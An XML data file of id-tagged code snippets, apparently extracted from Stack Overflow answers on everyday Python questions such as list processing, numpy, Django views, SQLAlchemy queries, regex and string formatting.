<?xml version="1.0" encoding="UTF-8" standalone="no"?><DATA><ROW><id>11838401</id><snippet>s=r
</snippet></ROW><ROW><id>11838582</id><snippet>a == b</snippet></ROW><ROW><id>11838582</id><snippet>a.__eq__(b)</snippet></ROW><ROW><id>11838582</id><snippet>a</snippet></ROW><ROW><id>11838582</id><snippet>b</snippet></ROW><ROW><id>11838582</id><snippet>==</snippet></ROW><ROW><id>11838582</id><snippet>is</snippet></ROW><ROW><id>11838582</id><snippet>a is b</snippet></ROW><ROW><id>11838582</id><snippet>a</snippet></ROW><ROW><id>11838582</id><snippet>b</snippet></ROW><ROW><id>11838785</id><snippet>dirlist = os.listdir('.')
</snippet></ROW><ROW><id>11838785</id><snippet>dirlist</snippet></ROW><ROW><id>11838785</id><snippet>filename1 
filename2
filename3
</snippet></ROW><ROW><id>11838785</id><snippet>dirlist[0]
dirlist[1]
dirlist[2]
</snippet></ROW><ROW><id>11838785</id><snippet>for</snippet></ROW><ROW><id>11838785</id><snippet>for names in dirlist:
   ...
</snippet></ROW><ROW><id>11838785</id><snippet>import os
os.chdir("C:/Users/any/Desktop/test")
for fname in os.listdir("."):
    fname = fname.replace('e', 'a')
    print fname
</snippet></ROW><ROW><id>11839395</id><snippet>temp</snippet></ROW><ROW><id>11839395</id><snippet>^</snippet></ROW><ROW><id>11839395</id><snippet>**</snippet></ROW><ROW><id>11839395</id><snippet>temp = int(temp)^2/key
</snippet></ROW><ROW><id>11839395</id><snippet>chr(int(temp[i]))
        ^^^^^^^
</snippet></ROW><ROW><id>11839395</id><snippet>temp</snippet></ROW><ROW><id>11839395</id><snippet>i</snippet></ROW><ROW><id>11839395</id><snippet>str(temp)[i]
</snippet></ROW><ROW><id>11839620</id><snippet>A.dot(B).dot(C)
</snippet></ROW><ROW><id>11839620</id><snippet>reduce(numpy.dot, [A1, A2, ..., An])
</snippet></ROW><ROW><id>11839620</id><snippet>&gt;&gt;&gt; A = [np.random.random((5, 5)) for i in xrange(4)]
&gt;&gt;&gt; product1 = A[0].dot(A[1]).dot(A[2]).dot(A[3])
&gt;&gt;&gt; product2 = reduce(numpy.dot, A)
&gt;&gt;&gt; numpy.all(product1 == product2)
True
</snippet></ROW><ROW><id>11839677</id><snippet>spam.txt</snippet></ROW><ROW><id>11839677</id><snippet>$ cat spam.txt
a,b,c,d,
1,1,2,3,
4,5,6,7,
1,2,5,7,
6,9,8,5,    
</snippet></ROW><ROW><id>11839677</id><snippet>&gt;&gt;&gt; with open('spam.txt', 'r') as file:
...     file.readline() # skip the first line
...     rows = [[int(x) for x in line.split(',')[:-1]] for line in file]
...     cols = [list(col) for col in zip(*rows)]
... 
'a,b,c,d,\n'
&gt;&gt;&gt; rows
[[1, 1, 2, 3], [4, 5, 6, 7], [1, 2, 5, 7], [6, 9, 8, 5]]
&gt;&gt;&gt; cols
[[1, 4, 1, 6], [1, 5, 2, 9], [2, 6, 5, 8], [3, 7, 7, 5]]
</snippet></ROW><ROW><id>11839677</id><snippet>zip(*rows)</snippet></ROW><ROW><id>11839677</id><snippet>zip(*rows)</snippet></ROW><ROW><id>11839677</id><snippet>zip([1, 1, 2, 3], [4, 5, 6, 7], [1, 2, 5, 7], [6, 9, 8, 5])</snippet></ROW><ROW><id>11839677</id><snippet>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; with open('spam.txt', 'r') as file:
...     ncols = len(file.readline().split(',')) - 1
...     data = np.fromiter((int(v) for line in file for v in line.split(',')[:-1]), int, count=-1)
...     cols = data.reshape(data.size / ncols, ncols).transpose()
...
&gt;&gt;&gt; cols
array([[1, 4, 1, 6],
       [1, 5, 2, 9],
       [2, 6, 5, 8],
       [3, 7, 7, 5]])
</snippet></ROW><ROW><id>11839983</id><snippet>ContactInfo</snippet></ROW><ROW><id>11839983</id><snippet>User</snippet></ROW><ROW><id>11839983</id><snippet>User</snippet></ROW><ROW><id>11839983</id><snippet>save</snippet></ROW><ROW><id>11839983</id><snippet>contact = ContactInfo(user=target_user)
# other stuff
contact.save()
#or 
target_user.contactinfo_set.create(...)#contactinfo_set is the related name of target_user
#Django maintains the foreign key things.
</snippet></ROW><ROW><id>11839983</id><snippet>ContactInfo</snippet></ROW><ROW><id>11839983</id><snippet>contact_info</snippet></ROW><ROW><id>11840118</id><snippet>xml.ElementTree.Element</snippet></ROW><ROW><id>11840118</id><snippet>list(elem)</snippet></ROW><ROW><id>11840118</id><snippet>import xml.etree.cElementTree as ET

s = '''
&lt;Node1&gt;
  &lt;Node11&gt;
    &lt;Node21&gt;
    &lt;/Node21&gt;
    &lt;Node22&gt;
    &lt;/Node22&gt;
    &lt;Node23&gt;
    &lt;/Node23&gt;
  &lt;/Node11&gt;
  &lt;Node12&gt;
  &lt;/Node12&gt;
  &lt;Node13&gt;
  &lt;/Node13&gt;
&lt;/Node1&gt;
'''

root = ET.fromstring(s)

print root
print list(root)
</snippet></ROW><ROW><id>11840252</id><snippet>itertools.permutations</snippet></ROW><ROW><id>11840252</id><snippet>perms = itertools.permutations('ABCDEFGHIJKLMNOPQRSTUVWXYZ', r=3)
</snippet></ROW><ROW><id>11840252</id><snippet>print(list(perms))</snippet></ROW><ROW><id>11840252</id><snippet>for</snippet></ROW><ROW><id>11840252</id><snippet>for perm in perms:
    ...
</snippet></ROW><ROW><id>11841092</id><snippet>from collections import Counter

advk = Counter(['a','a','r','d','v','a','r','k'])

with open('input.txt', 'rU') as file:
    for i, line in enumerate(file.readlines()):
        if not advk - Counter(line.lower()):
            print ("Aardvark on line " + str(i+1))
</snippet></ROW><ROW><id>11841092</id><snippet>Counter({'d': 5, 'a': 4, 'f': 2, 's': 2, 'r': 2, 'k': 1, 'v': 1})
</snippet></ROW><ROW><id>11841092</id><snippet>Counter({'a': 3, 'r': 2, 'd': 1, 'k': 1, 'v': 1})
</snippet></ROW><ROW><id>11841092</id><snippet>advl - Counter(line.lower())</snippet></ROW><ROW><id>11841121</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; [i for i in some_list if not re.match(r"[98]\B|+\(91\)", i)]
['8-4-236/2', '9-6-32/45', 'Need to fetch some strings']
</snippet></ROW><ROW><id>11841121</id><snippet>\B</snippet></ROW><ROW><id>11841121</id><snippet>9</snippet></ROW><ROW><id>11841121</id><snippet>1</snippet></ROW><ROW><id>11841121</id><snippet>9</snippet></ROW><ROW><id>11841121</id><snippet>-</snippet></ROW><ROW><id>11841189</id><snippet>class List(list):
    def push(self, x):
        self.append(x)
</snippet></ROW><ROW><id>11841189</id><snippet>&gt;&gt;&gt; s = List()
&gt;&gt;&gt; s.push(10)
&gt;&gt;&gt; s.push(20)
&gt;&gt;&gt; s
[10, 20]
</snippet></ROW><ROW><id>11841913</id><snippet>cascade</snippet></ROW><ROW><id>11841913</id><snippet>relationship</snippet></ROW><ROW><id>11841913</id><snippet>Session</snippet></ROW><ROW><id>11841913</id><snippet>Session.delete</snippet></ROW><ROW><id>11841913</id><snippet>ON X CASCADE</snippet></ROW><ROW><id>11841913</id><snippet>cascade='all'</snippet></ROW><ROW><id>11841913</id><snippet>Session.delete</snippet></ROW><ROW><id>11841913</id><snippet>AB</snippet></ROW><ROW><id>11841913</id><snippet>passive_deletes=True</snippet></ROW><ROW><id>11841913</id><snippet>ON DELETE CASCADE</snippet></ROW><ROW><id>11841913</id><snippet>DELETE</snippet></ROW><ROW><id>11841913</id><snippet>relationship(cascade=...)</snippet></ROW><ROW><id>11841972</id><snippet>dic={'BOB':  [['AUDI', 'BLACK', 'PETROL'],
          ['MINI', 'PINK', 'PETROL'],
          ['VW', 'BLUE', 'DIESEL']],
 'DAVE': [['BMW', 'PURPLE', 'PETROL'],
          ['VOLVO', 'GREY', 'PETROL']]}
dic1={'TYRE': 'RUBBER', 'ALLOY': 17, 'SUNROOF': 'YES'}
for x in dic:
    for y in dic[x]:
        y.append(dic1)
print dic    
</snippet></ROW><ROW><id>11841972</id><snippet>{'BOB': [['AUDI', 'BLACK', 'PETROL', {'ALLOY': 17, 'SUNROOF': 'YES', 'TYRE': 'RUBBER'}], ['MINI', 'PINK', 'PETROL', {'ALLOY': 17, 'SUNROOF': 'YES', 'TYRE': 'RUBBER'}], ['VW', 'BLUE', 'DIESEL', {'ALLOY': 17, 'SUNROOF': 'YES', 'TYRE': 'RUBBER'}]], 'DAVE': [['BMW', 'PURPLE', 'PETROL', {'ALLOY': 17, 'SUNROOF': 'YES', 'TYRE': 'RUBBER'}], ['VOLVO', 'GREY', 'PETROL', {'ALLOY': 17, 'SUNROOF': 'YES', 'TYRE': 'RUBBER'}]]}
</snippet></ROW><ROW><id>11842689</id><snippet>GATEWAY_INTERFACE</snippet></ROW><ROW><id>11842689</id><snippet>import os
if 'GATEWAY_INTERFACE' in os.environ:
    print ('CGI')
else:
    print ('Not CGI. CLI?')
</snippet></ROW><ROW><id>11842753</id><snippet> $('#country').change(function() { 
    var value = $(this).attr('value'); 
    var request = $.ajax({
        url: "/getcities/",
        type: "GET",
        data: {country : value},
        dataType: "json",

        success: function(data) {
         //Popluate combo here by unpacking the json
        }
    });


});
</snippet></ROW><ROW><id>11842753</id><snippet>def getcities(request)
    if request.method == "GET":
        country = request.GET["country"]
        cities = Cities.objects.filter(country=country)
        results = [{'city': str(city.name), 'id':city.id} for city in cities]
        json = simplejson.dumps(results)
        return HttpResponse(json, mimetype='application/json')
</snippet></ROW><ROW><id>11842754</id><snippet>textfile=open('somefile.txt','r')
text_list=[line.split(' ') for line in textfile]
unique_words=[word for word in text_list if word not in unique_words]
print(len(unique_words))
</snippet></ROW><ROW><id>11843039</id><snippet>&gt;&gt;&gt; [i for i in address if not re.match(r"[98]\B|\+\(91\)\B", i)]
['Mr Thomas', '8-4-236/2']
</snippet></ROW><ROW><id>11843039</id><snippet>&gt;&gt;&gt; filter(lambda x: not re.match(r"[98]\B|\+\(91\)\B", x), address)
['Mr Thomas', '8-4-236/2']
</snippet></ROW><ROW><id>11843167</id><snippet>fh = open( "heli.txt" );

heliList = []
for line in fh.readlines():
    y = [int(value) for value in line.split()] #added "int( )"
    heliList.append( y )

fh.close()
</snippet></ROW><ROW><id>11843167</id><snippet>tick = 0
while True:
    for enemy in enemylist:
        if enemy[0] == tick:
            DO_YOUR_CODE
    tick += 1
    #dont forget to add an exit to this loop
</snippet></ROW><ROW><id>11843250</id><snippet>,</snippet></ROW><ROW><id>11843250</id><snippet>print ('%10d %10s') % (value1, value2),
</snippet></ROW><ROW><id>11843250</id><snippet>'\n'</snippet></ROW><ROW><id>11843250</id><snippet>print</snippet></ROW><ROW><id>11843250</id><snippet>print</snippet></ROW><ROW><id>11843610</id><snippet>&gt;&gt;&gt; a = "fkjdlfjzgjkdsheiwqueqpwnvkasdakpp"
&gt;&gt;&gt; print a[10]
k
</snippet></ROW><ROW><id>11843645</id><snippet>queue</snippet></ROW><ROW><id>11843645</id><snippet>queue</snippet></ROW><ROW><id>11843645</id><snippet>Queue</snippet></ROW><ROW><id>11843989</id><snippet>&gt;&gt;&gt; "app and a.b.c.d".split()
['app', 'and', 'a.b.c.d']
</snippet></ROW><ROW><id>11844106</id><snippet>class Window(object):
def __init__(self, name):
    self.wind_name = name

def getWindowName(self):
    return 'wnd' + self.wind_name

class Control(object):
    def __init__(self, name, wnd):
        self.contrl_name = name
        self.wnd = wnd
        setattr(self, 'getWindowName', wnd.getWindowName)

    def get_wind_name(self):
        return self.wnd.wind_name
    def set_wind_name(self, v):
        self.wnd.wind_name = v

    wind_name = property(get_wind_name, set_wind_name)
    def getControlName(self):
        return (self.getWindowName(), 'unk' + self.contrl_name)

class Button(Control):
    def __init__(self, name, wnd):
        super(Button, self).__init__(name, wnd)
    def getControlName(self):
        return (self.getWindowName(), 'btn' + self.contrl_name)

wnd = Window('MyApp')
btnOK = Button('OK', wnd)
print btnOK.getControlName() # work ok., return ('wndMyApp', 'btnOK')
btnOK.wind_name = 'NewApp'
print btnOK.getControlName()
</snippet></ROW><ROW><id>11844131</id><snippet>print</snippet></ROW><ROW><id>11844131</id><snippet>str(c)</snippet></ROW><ROW><id>11844131</id><snippet>c</snippet></ROW><ROW><id>11844131</id><snippet>print</snippet></ROW><ROW><id>11844131</id><snippet>print "a + b as integers: ", c  # note the comma here
</snippet></ROW><ROW><id>11844131</id><snippet>str(c)
</snippet></ROW><ROW><id>11844131</id><snippet>Enter a: 3
Enter b: 7
a + b as strings:  37
a + b as integers:  10
</snippet></ROW><ROW><id>11844131</id><snippet>a = raw_input("Enter a: ")
b = raw_input("Enter b: ")
print "a + b as strings: " + a + b  # + everywhere is ok since all are strings
a = int(a)
b = int(b)
c = a + b
print "a + b as integers: ", c
</snippet></ROW><ROW><id>11844141</id><snippet>email</snippet></ROW><ROW><id>11844141</id><snippet>from email.Message import Message
m = Message()
m['From'] = 'me'
m['To'] = 'you'
m['X-Priority'] = '2'
m['Subject'] = 'Urgent!'
m.set_payload('Nothing.')
</snippet></ROW><ROW><id>11844141</id><snippet>smtp.sendmail(from_addr, to_addr, m.as_string())
</snippet></ROW><ROW><id>11844255</id><snippet>while True:
    choice = raw_input('...')

    if choice in variables:
        print "You chave chosen", choice

        # Remove the chosen member from the list
        variables = [v for v in variables if v != choice]

        # Break out of loop
        break

    # Print error messages etc.
</snippet></ROW><ROW><id>11844255</id><snippet>'Displacement' != 'displacement'</snippet></ROW><ROW><id>11844381</id><snippet>cmp</snippet></ROW><ROW><id>11844381</id><snippet>key</snippet></ROW><ROW><id>11844381</id><snippet>key = str</snippet></ROW><ROW><id>11844381</id><snippet>In [2]: max([10,9], key = str)
Out[2]: 9
</snippet></ROW><ROW><id>11844476</id><snippet>self.scrolledwindow.add_with_viewport(self.sourceview)
</snippet></ROW><ROW><id>11844476</id><snippet>add_with_viewport</snippet></ROW><ROW><id>11844476</id><snippet>GtkTextView</snippet></ROW><ROW><id>11844476</id><snippet>GtkSourceView</snippet></ROW><ROW><id>11844476</id><snippet>GtkContainer.add()</snippet></ROW><ROW><id>11844556</id><snippet>urlpatterns = patterns( '',     
    url( r'^character/(?P&lt;vocabularyCharacterSlug&gt;[-\w]+)/$',
        vocabulary_character_detail,
        name = 'vocabulary_character' ),

    url( r'^translation/(?P&lt;vocabularyTranslationSlug&gt;[-\w]+)/$',
        vocabulary_translation_detail,
        name = 'vocabulary_translation' ),

    url( r'^pinyin/(?P&lt;vocabularyPinyinSlug&gt;[-\w]+)/$',
        vocabulary_pinyin_detail,
        name = 'vocabulary_pinyin' ),
</snippet></ROW><ROW><id>11844556</id><snippet>def vocabulary_character_detail( request, vocabularyCharacterSlug ):

   vocabulary = get_object_or_404( Vocabulary, vocabularyCharacterSlug = vocabularyCharacterSlug )
   return render_to_response( 'vocabulary/character/vocabulary_character_detail.html',
                          {'vocabulary': vocabulary} )

def vocabulary_translation_detail( request, vocabularyTranslationSlug ):

   vocabulary = get_object_or_404( Vocabulary, vocabularyTranslationSlug = vocabularyTranslationSlug )
   return render_to_response( 'vocabulary/translation/vocabulary_translation_detail.html',
                          {'vocabulary': vocabulary} )

def vocabulary_pinyin_detail( request, vocabularyPinyinSlug ):

   vocabulary = get_object_or_404( Vocabulary, vocabularyPinyinSlug = vocabularyPinyinSlug )
   return render_to_response( 'vocabulary/pinyin/vocabulary_pinyin_detail.html',
                          {'vocabulary': vocabulary} 
</snippet></ROW><ROW><id>11844634</id><snippet>Query.all()</snippet></ROW><ROW><id>11844634</id><snippet>[].users</snippet></ROW><ROW><id>11844634</id><snippet># 1: this should be fine
qry1 = Car.query.join(User, Car.users).filter(User.name=='you')

# 1: this will probably not work for you, as this is not one query, although the result is a Query instance
usr1 = User.query.filter_by(name='you').one()
qry2 = Car.query.with_parent(usr1)

# 3: you might define the relationship to be lazy='dynamic', in which case the query object instance will be returned
from sqlalchemy.orm.query import Query
class Car(Base):
    __tablename__ = 'cars'
    id = Column(Integer, primary_key=True)
    vin = Column(String(50), unique=True, nullable=False)

    users = relationship(User, secondary=user_cars, 
            #backref='cars',
            backref=backref('cars', lazy="dynamic"),
            lazy="dynamic",
            )
qry3 = Car.query.filter_by(name="you").one().cars
assert isinstance(qry3, Query)
</snippet></ROW><ROW><id>11844983</id><snippet>ab</snippet></ROW><ROW><id>11844983</id><snippet>ab -c 5 -n 1000 http://yoururlhere.com
</snippet></ROW><ROW><id>11844983</id><snippet>import logging
def my_slow_code(self):
  start = time.time()
  [slow code]
  logging.debug('my_slow_code took %s s to load' % str(time.time()-start))
</snippet></ROW><ROW><id>11845065</id><snippet>python x.py &gt; my_file
Traceback (most recent call last):
File "x.py", line 2, in &lt;module&gt;
    print x
UnicodeEncodeError: 'ascii' codec can't encode character u'\xe8' in position 3: ordinal not in range(128)
</snippet></ROW><ROW><id>11845065</id><snippet>encode</snippet></ROW><ROW><id>11845065</id><snippet>x = u'Gen\xe8ve'.encode('utf-8') 
print x
</snippet></ROW><ROW><id>11845065</id><snippet>$echo $(python x.py)
Genève
$python x.py 
Genève
</snippet></ROW><ROW><id>11845289</id><snippet>raw_input("Hello %r, what is your age? " % firstname)
</snippet></ROW><ROW><id>11845289</id><snippet>raw_input("Hello %r, what is your age? ") % firstname
</snippet></ROW><ROW><id>11845289</id><snippet>"Hello %r, ..."</snippet></ROW><ROW><id>11845289</id><snippet>raw_input</snippet></ROW><ROW><id>11845429</id><snippet>I would like to have these tools working with each other nicely. Like version control system, code review tool and issue tracking system communicating with each other.
</snippet></ROW><ROW><id>11845429</id><snippet>pep8</snippet></ROW><ROW><id>11845429</id><snippet>pip install pep8</snippet></ROW><ROW><id>11845443</id><snippet>f = Obj.objects.get(id=obj_id)
myfile = open(os.path.join(MEDIA_ROOT, f.Audio.path)).read()
...

response = HttpResponse(myfile, content_type="audio/mpeg")
response['Content-Disposition'] = 'attachment; filename=myfile.mp3'

return response
</snippet></ROW><ROW><id>11845602</id><snippet>False</snippet></ROW><ROW><id>11845602</id><snippet>True</snippet></ROW><ROW><id>11845602</id><snippet>NotImplemented</snippet></ROW><ROW><id>11845602</id><snippet>__lt__</snippet></ROW><ROW><id>11845602</id><snippet>def __lt__(self, other):
    if not isinstance(other, X):
        return NotImplemented
    return self._a &lt; other._a
</snippet></ROW><ROW><id>11845602</id><snippet>NotImplemented</snippet></ROW><ROW><id>11845602</id><snippet>False</snippet></ROW><ROW><id>11845602</id><snippet>True</snippet></ROW><ROW><id>11845602</id><snippet>bool()</snippet></ROW><ROW><id>11845878</id><snippet>time.time()</snippet></ROW><ROW><id>11845878</id><snippet>time.time</snippet></ROW><ROW><id>11845878</id><snippet>time</snippet></ROW><ROW><id>11845878</id><snippet>time</snippet></ROW><ROW><id>11845878</id><snippet>time.time</snippet></ROW><ROW><id>11846185</id><snippet>r</snippet></ROW><ROW><id>11846185</id><snippet>find.sub('\1', text)
</snippet></ROW><ROW><id>11846185</id><snippet>find.sub(r'\1', text)
</snippet></ROW><ROW><id>11846185</id><snippet>text = "Replace this Word "
find = re.compile(ur"\s+(Word)\s+", flags = re.U)
find.sub(r'\1', text)
# 'Replace thisWord'
</snippet></ROW><ROW><id>11846310</id><snippet>task = ["svn",  "move",  "folder/hello world anotherfolder/hello world"]
subprocess.check_call(task)
</snippet></ROW><ROW><id>11846310</id><snippet>task = shlex.split(s)
subprocess.check_call(task)
</snippet></ROW><ROW><id>11846411</id><snippet>and</snippet></ROW><ROW><id>11846411</id><snippet>if</snippet></ROW><ROW><id>11846411</id><snippet>bool()</snippet></ROW><ROW><id>11846411</id><snippet>and</snippet></ROW><ROW><id>11846411</id><snippet>or</snippet></ROW><ROW><id>11846411</id><snippet>&gt;&gt;&gt; 0 and 'string'
0
&gt;&gt;&gt; 1 and 'string'
'string'
&gt;&gt;&gt; 'string' or 10
'string'
&gt;&gt;&gt; '' or 10
10
</snippet></ROW><ROW><id>11846411</id><snippet>not</snippet></ROW><ROW><id>11846411</id><snippet>True</snippet></ROW><ROW><id>11846411</id><snippet>False</snippet></ROW><ROW><id>11846411</id><snippet>None</snippet></ROW><ROW><id>11846411</id><snippet>0</snippet></ROW><ROW><id>11846411</id><snippet>''</snippet></ROW><ROW><id>11846411</id><snippet>False</snippet></ROW><ROW><id>11846411</id><snippet>True</snippet></ROW><ROW><id>11846411</id><snippet>.__nonzero__()</snippet></ROW><ROW><id>11846411</id><snippet>True</snippet></ROW><ROW><id>11846411</id><snippet>False</snippet></ROW><ROW><id>11846411</id><snippet>.__len__()</snippet></ROW><ROW><id>11846411</id><snippet>0</snippet></ROW><ROW><id>11846411</id><snippet>False</snippet></ROW><ROW><id>11846411</id><snippet>True</snippet></ROW><ROW><id>11846411</id><snippet>True</snippet></ROW><ROW><id>11847259</id><snippet>for a in soup.findAll("a", "title"):
    print a.get_text()
</snippet></ROW><ROW><id>11847432</id><snippet>list.append()</snippet></ROW><ROW><id>11847432</id><snippet>L=[]
while "END" not in L :
   L.append(something)
</snippet></ROW><ROW><id>11847476</id><snippet>import operator
ops = {'==' : operator.eq,
       '!=' : operator.ne,
       '&lt;=' : operator.le,
       '&gt;=' : operator.ge,
       '&gt;'  : operator.gt,
       '&lt;'  : operator.lt}

maths_operator = "=="

if ops[maths_operator]("test", "test"):
    print "match found"

maths_operator = "!="

if ops[maths_operator]("test", "test"):
    print "match found"
else:
    print "match not found"
</snippet></ROW><ROW><id>11847525</id><snippet>&gt;&gt;&gt; [aList[i] for i in myIndices]
</snippet></ROW><ROW><id>11847561</id><snippet>controller.open(url)
</snippet></ROW><ROW><id>11847897</id><snippet>&gt;&gt;&gt; a = 2
&gt;&gt;&gt; "a squared is %s" % a
'a squared is 2'
&gt;&gt;&gt; ("a squared is %s" % a)*a
'a squared is 2a squared is 2'
&gt;&gt;&gt; "a squared is %s" % a*a
'a squared is 2a squared is 2'
&gt;&gt;&gt; "a squared is %s" % (a*a)
'a squared is 4'
</snippet></ROW><ROW><id>11847897</id><snippet>%</snippet></ROW><ROW><id>11847897</id><snippet>a</snippet></ROW><ROW><id>11847897</id><snippet>a**2</snippet></ROW><ROW><id>11847897</id><snippet>**</snippet></ROW><ROW><id>11847897</id><snippet>a</snippet></ROW><ROW><id>11847897</id><snippet>2</snippet></ROW><ROW><id>11847897</id><snippet>%</snippet></ROW><ROW><id>11848281</id><snippet>include src/static/*
include src/Potato/*.txt
</snippet></ROW><ROW><id>11848776</id><snippet>image</snippet></ROW><ROW><id>11848776</id><snippet>url = images.get_serving_url(product.image)
</snippet></ROW><ROW><id>11848830</id><snippet>sort()</snippet></ROW><ROW><id>11848830</id><snippet>key</snippet></ROW><ROW><id>11848830</id><snippet>&gt;&gt;&gt; my_list = [(1, 2), (3, 4), (2, 1), (3, 2)]
&gt;&gt;&gt; my_list.sort(key=lambda x: x[1])
&gt;&gt;&gt; my_list
[(2, 1), (1, 2), (3, 2), (3, 4)]
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>11848830</id><snippet>sorted()</snippet></ROW><ROW><id>11848830</id><snippet>&gt;&gt;&gt; sorted(my_list, key=lambda x: x[1])
[(2, 1), (1, 2), (3, 2), (3, 4)]
</snippet></ROW><ROW><id>11849056</id><snippet>arr</snippet></ROW><ROW><id>11849056</id><snippet>f1()</snippet></ROW><ROW><id>11849056</id><snippet>f2()</snippet></ROW><ROW><id>11849056</id><snippet>from __future__ import print_function
import ctypes
import time
from multiprocessing import Process, Array, Value

values = [(s*4).encode('ascii') for s in 'abc']

def f1(a, v):
    for i, s in enumerate(values):
        a[i] = s

    v.value += 1

    print("f1 : ", a[:], v.value)

def f2(a,v):
    v.value += 1
    print("f2 : ", a[:], v.value)

def main():
    val = Value(ctypes.c_int, 0)
    arr = Array(ctypes.c_char_p, 3)

    print("Before :", arr[:], val.value)

    p = Process(target=f1, args=(arr, val))
    p2 = Process(target=f2, args=(arr, val))

    p.start()
    p2.start()

    p.join()
    p2.join()

    print("After : ", arr[:], val.value)

if __name__ == '__main__':
    main()
</snippet></ROW><ROW><id>11849056</id><snippet>Before : [None, None, None] 0
f1 :  ['aaaa', 'bbbb', 'cccc'] 1
f2 :  ['aaaa', 'bbbb', 'cccc'] 2
After :  ['aaaa', 'bbbb', 'cccc'] 2
</snippet></ROW><ROW><id>11849195</id><snippet>index = [index for index,line in enumerate(all_lines) if "Gold.Protein.RotatedAtoms"  in line]
</snippet></ROW><ROW><id>11849257</id><snippet>repr(float)</snippet></ROW><ROW><id>11849257</id><snippet>str.format</snippet></ROW><ROW><id>11849257</id><snippet>"{0!r}"</snippet></ROW><ROW><id>11849257</id><snippet>repr</snippet></ROW><ROW><id>11849257</id><snippet>"{0:g}"</snippet></ROW><ROW><id>11849257</id><snippet>float</snippet></ROW><ROW><id>11849257</id><snippet>__format__</snippet></ROW><ROW><id>11849257</id><snippet>class FixFloat(float):
    def __format__(self, format_spec):
        return 'nan' if math.isnan(self) else float.__format__(self, format_spec)

"{0:g}".format(FixFloat(1.2345e9))
'1.2345e+09'
"{0:g}".format(FixFloat(float('nan')))
'nan'
</snippet></ROW><ROW><id>11849337</id><snippet>def is_anonymous(self):
    return self.id == 0
</snippet></ROW><ROW><id>11849360</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; from operator import itemgetter
&gt;&gt;&gt; mystr='Version 1.15.6\n'
&gt;&gt;&gt; m = re.match('Version (?P&lt;_0&gt;.+)\.(?P&lt;_1&gt;.+)\.(?P&lt;_2&gt;.+)', mystr)
&gt;&gt;&gt; map(itemgetter(1), sorted(m.groupdict().items()))
['1', '15', '6']
</snippet></ROW><ROW><id>11849360</id><snippet>&gt;&gt;&gt; re.sub(r'\\{(\d+)\\}', r'(?P&lt;_\1&gt;.+)', re.escape('Version {0}.{1}.{2}'))
'Version\\ (?P&lt;_0&gt;.+)\\.(?P&lt;_1&gt;.+)\\.(?P&lt;_2&gt;.+)'
</snippet></ROW><ROW><id>11849678</id><snippet>seconds_list = list("{0:#b}".format(second)[:1:-1])
</snippet></ROW><ROW><id>11849678</id><snippet>from:to:step</snippet></ROW><ROW><id>11849678</id><snippet>from</snippet></ROW><ROW><id>11849678</id><snippet>None</snippet></ROW><ROW><id>11849678</id><snippet>to</snippet></ROW><ROW><id>11849678</id><snippet>-1</snippet></ROW><ROW><id>11849678</id><snippet>from</snippet></ROW><ROW><id>11849744</id><snippet>sweet = {'1234-4321-1': [5, 6, -4, 11, 22], 
         '1234-7834-1': [43, -5, 0, 0, -1],
         '1234-5376-1': [3, 0, -5, -6, 0],
         '1567-3454-1': [4, 6, 8, 3, 3],
         '1567-9987-1': [1, 2, 1, -4, 5] }
</snippet></ROW><ROW><id>11849744</id><snippet>sweet['1234-4321-1']</snippet></ROW><ROW><id>11849744</id><snippet>sweet = {'1234': [['4321-1', [5, 6, -4, 11, 22]], 
                  ['7834-1', [43, -5, 0, 0, -1]],
                  ['5376-1', [3, 0, -5, -6, 0]]],
         '1567': [['3454-1', [4, 6, 8, 3, 3]],
                 ['9987-1', [1, 2, 1, -4, 5]]] 
        }
</snippet></ROW><ROW><id>11849744</id><snippet>sweet['1234']</snippet></ROW><ROW><id>11849744</id><snippet>sweet['1234'][0]</snippet></ROW><ROW><id>11849744</id><snippet>sweet = [['1234-4321-1',[5, 6, -4, 11, 22]], ['1234-7834-1', [43, -5, 0, 0, -1]], ['1234-5376-1', [3, 0, -5, -6, 0]], ['1567-3454-1', [4, 6, 8, 3, 3]], ['1567-9987-1-', [1, 2, 1, -4, 5]]]

skip = False
for i in range(len(sweet)-1):
    if skip: #skip over the '#' that was just inserted
            skip = False
            continue
    front_num_1 = sweet[i][0].split('-')[0]
    front_num_2 = sweet[i+1][0].split('-')[0]
    if front_num_1 != front_num_2:
        sweet.insert(i+1, '#')
        skip = True

print sweet
</snippet></ROW><ROW><id>11849835</id><snippet>In [43]: A = np.array([1,1,2,3,4], dtype = 'float')

In [44]: A[::2]  += 0.1

In [45]: A
Out[45]: array([ 1.1,  1. ,  2.1,  3. ,  4.1])
</snippet></ROW><ROW><id>11849835</id><snippet>A</snippet></ROW><ROW><id>11849835</id><snippet>A</snippet></ROW><ROW><id>11849835</id><snippet>A</snippet></ROW><ROW><id>11849835</id><snippet>In [46]: A = np.array([1,1,2,3,4], dtype = 'float')

In [47]: B = A.copy()

In [48]: B[::2]  += 0.1

In [49]: B
Out[49]: array([ 1.1,  1. ,  2.1,  3. ,  4.1])

In [50]: A
Out[50]: array([ 1.,  1.,  2.,  3.,  4.])
</snippet></ROW><ROW><id>11849948</id><snippet>SymList.__init__()</snippet></ROW><ROW><id>11849948</id><snippet>    def __init__(self, L=None):
        if L is None:
             self.L = []
        else:
             self.L = L
</snippet></ROW><ROW><id>11849948</id><snippet>self.L</snippet></ROW><ROW><id>11849948</id><snippet>L</snippet></ROW><ROW><id>11849948</id><snippet>SymList.__init__()</snippet></ROW><ROW><id>11849948</id><snippet>L</snippet></ROW><ROW><id>11850385</id><snippet>_errors</snippet></ROW><ROW><id>11850385</id><snippet>form._errors['__all__']</snippet></ROW><ROW><id>11850385</id><snippet>foo</snippet></ROW><ROW><id>11850385</id><snippet>form._errors['foo']</snippet></ROW><ROW><id>11850385</id><snippet>_errors</snippet></ROW><ROW><id>11850385</id><snippet>ErrorList</snippet></ROW><ROW><id>11850385</id><snippet>from django.forms.util import ErrorList

form._errors.setdefault('foo', ErrorList()).append('Some error here')
</snippet></ROW><ROW><id>11850385</id><snippet>form._errors.setdefault('__all__', ErrorList()).append('Some error here')
</snippet></ROW><ROW><id>11850492</id><snippet>The sort() method takes optional arguments for controlling the comparisons.

cmp specifies a custom comparison function of two arguments (list items) which should 
return a negative, zero or positive number depending on whether the first argument is
considered smaller than, equal to, or larger than the second argument:
cmp=lambda x,y: cmp(x.lower(), y.lower()). The default value is None.
